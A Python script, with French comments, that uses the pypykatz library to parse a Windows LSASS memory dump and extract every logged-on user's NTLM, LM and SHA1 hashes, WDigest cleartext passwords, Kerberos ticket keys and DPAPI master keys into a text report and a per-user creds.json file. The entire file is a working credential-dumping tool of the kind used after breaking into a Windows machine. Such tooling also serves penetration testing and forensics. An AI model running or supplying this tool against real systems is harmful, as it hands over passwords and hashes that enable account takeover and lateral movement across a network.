import argparse
import json
from datetime import datetime
from pathlib import Path
from pypykatz.pypykatz import pypykatz
from collections import defaultdict

users = defaultdict(dict)

def parse_sessions(logons):

    results = []

    for luid, session in logons.items():

        base = {

            "luid": luid,

            "username": session.username or "",

            "domain": session.domainname or "",

            "sid": session.sid or "",

            "logon_time": str(session.logon_time),

            "hostname": session.logon_server or "",


        }


        for msv in session.msv_creds:
            results.append({
                **base,
                "source": "MSV",
                "dpapi": msv.DPAPI.hex() if isinstance(msv.DPAPI, bytes) else msv.DPAPI,
                "lmhash": msv.LMHash.hex() if isinstance(msv.LMHash, bytes) else msv.LMHash,
                "ntlm": msv.NThash.hex() if isinstance(msv.NThash, bytes) else msv.NThash,
                "sha1": msv.SHAHash.hex() if isinstance(msv.SHAHash, bytes) else msv.SHAHash
            })


        for wd in session.wdigest_creds:
            results.append({
                **base,
                "source": "WDigest",
                "password": wd.password or wd.password_raw or ""
             })


        for krb in session.kerberos_creds:
            tickets = krb.tickets if isinstance(krb.tickets, list) else [krb.tickets]
            for t in tickets:
                if isinstance(t, dict):
                    # 👇 récupération du hostname depuis EClientName
                    client_names = t.get("EClientName", [])
                    hostname = client_names[0] if isinstance(client_names, list) and client_names else ""

                    results.append({
                        **base,
                        "source": "Kerberos",
                        "ticket_start": t.get("StartTime", ""),
                        "ticket_end": t.get("EndTime", ""),
                        "key": t.get("Key", ""),
                        "hostname": hostname
                    })



        for dpapi in session.dpapi_creds:

            results.append({

                **base,

                "source": "DPAPI",

                "guid": getattr(dpapi, "key_guid", ""),

                "masterkey": getattr(dpapi, "masterkey", "")

            })

    return results

def main(dmp_path, output_txt, output_json):

    if not Path(dmp_path).exists():

        print(f"[!] Fichier introuvable : {dmp_path}")

        return

    print(f"[+] Analyse de : {dmp_path}")

    mimi = pypykatz.parse_minidump_file(dmp_path)

    # Export JSON brut

    raw_json = { dmp_path: mimi.to_dict() }

    with open(output_json, 'w', encoding='utf-8') as jf:

        json.dump(raw_json, jf, indent=2, default=str)

    print(f"[+] JSON brut sauvegardé dans : {output_json}")

    # Extraction logique

    parsed = parse_sessions(mimi.logon_sessions)

    # Rapport lisible

    with open(output_txt, 'w', encoding='utf-8') as f:

        f.write(f"# Rapport d'extraction - {datetime.now()}\n\n")

        for e in parsed:

            line = f"{e['username']}@{e['domain']} | {e['source']} | "

            if e['source'] == "MSV":
                line += f"Hostname: {e.get('hostname', '')} | DPAPI: {e.get('dpapi', '')} | NTLM: {e.get('ntlm', '')} | SHA1: {e.get('sha1', '')}"


            elif e['source'] == "WDigest":

                line += f"Password: {e.get('password')} | Hostname: {e.get('hostname', '')}"

            elif e['source'] == "Kerberos":

                line += f"TGT: {e.get('ticket_start')} - {e.get('ticket_end')} | Key: {e.get('key')} | Hostname: {e.get('hostname', '')}"

            elif e['source'] == "DPAPI":

                line += f"GUID: {e.get('guid')} | MasterKey: {e.get('masterkey')}"

            line += f" | SID: {e['sid']}\n"

            f.write(line)

    print(f"[+] Rapport final : {output_txt}")


    for entry in parsed:
        key = entry["username"].lower()
        users[key]["username"] = entry["username"]
        users[key]["domain"] = entry["domain"]
        users[key]["sid"] = entry["sid"]
        users[key]["hostname"] = entry.get("hostname", "")
        if entry["source"] == "MSV":
            users[key]["ntlm"] = entry.get("ntlm", "")
            users[key]["sha1"] = entry.get("sha1", "")
            users[key]["dpapi"] = entry.get("dpapi", "")
        if entry["source"] == "WDigest" and entry.get("password"):
            users[key]["password"] = entry.get("password", "")
        if entry["source"] == "Kerberos":
            users[key]["tgt"] = {
                "start": entry.get("ticket_start", ""),
                "end": entry.get("ticket_end", ""),
                "key": entry.get("key", "")
             }

    # Écriture
    with open("creds.json", "w") as f:
        json.dump(list(users.values()), f, indent=2)
    print("[+] Rapport JSON par utilisateur : creds.json")


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Extract credentials from lsass.dmp using pypykatz")

    parser.add_argument("dmp", help="Chemin vers le fichier lsass.dmp")

    parser.add_argument("-o", "--out", default="parsed_credentials.txt", help="Fichier de sortie lisible")

    parser.add_argument("-j", "--json", default="pypykatz_raw.json", help="Fichier JSON brut de sortie")

    args = parser.parse_args()

    main(args.dmp, args.out, args.json)
 
